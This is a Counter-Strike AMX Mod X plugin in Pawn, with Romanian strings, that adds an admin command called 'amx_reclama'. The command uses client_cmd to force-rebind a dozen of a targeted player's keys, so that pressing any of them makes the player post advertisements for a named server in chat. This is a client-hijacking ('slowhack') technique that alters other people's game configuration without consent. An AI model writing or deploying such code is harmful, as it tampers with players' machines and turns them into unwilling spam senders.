#include <amxmodx>
#include <amxmisc>

new hostname

public plugin_init()
{
	register_plugin("Reclama", "1.0", "Mister X")
	register_concmd("amx_reclama", "cmd_reclama", ADMIN_LEVEL_E,"<nume> : ii pune playerului binduri cu numele serverului")
	hostname = register_cvar("dns_server", "jb.Dobs.ro");
}

public cmd_reclama(id,level,cid)
{
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	new arg[32]
	new name[32]
	
	read_argv(1,arg,31)
	
	new player = cmd_target(id,arg,9)
	if (!player) return PLUGIN_HANDLED
	
	get_user_name(player,name,31)
	new message[500],server[50]
	get_pcvar_string(hostname,server,49)
	format(message,499,"Intrati pe %s cel mai tare server",server)
	client_cmd(player,"bind k ^"say %s^" ",message)
	client_cmd(player,"bind t ^"say %s^" ",message)
	client_cmd(player,"bind h ^"say %s^" ",message)
	format(message,499,"%s cel mai tare server, go go go",server)
	client_cmd(player,"bind e ^"say %s^" ",message)
	client_cmd(player,"bind m ^"say %s^" ",message)
	client_cmd(player,"bind z ^"say %s^" ",message)
	format(message,499,"Unic in romania, intrati pe %s",server)
	client_cmd(player,"bind f ^"say %s^" ",message)
	client_cmd(player,"bind b ^"say %s^" ",message)
	client_cmd(player,"bind x ^"say %s^" ",message)
	format(message,499,"Nui alt server ca %s, intrat",server)
	client_cmd(player,"bind c ^"say %s^" ",message)
	client_cmd(player,"bind v ^"say %s^" ",message)
	client_cmd(player,"bind p ^"say %s^" ",message)
	client_print(0,print_console,"Jucatorul %s a primit bind de reclama",name)
	return PLUGIN_HANDLED
}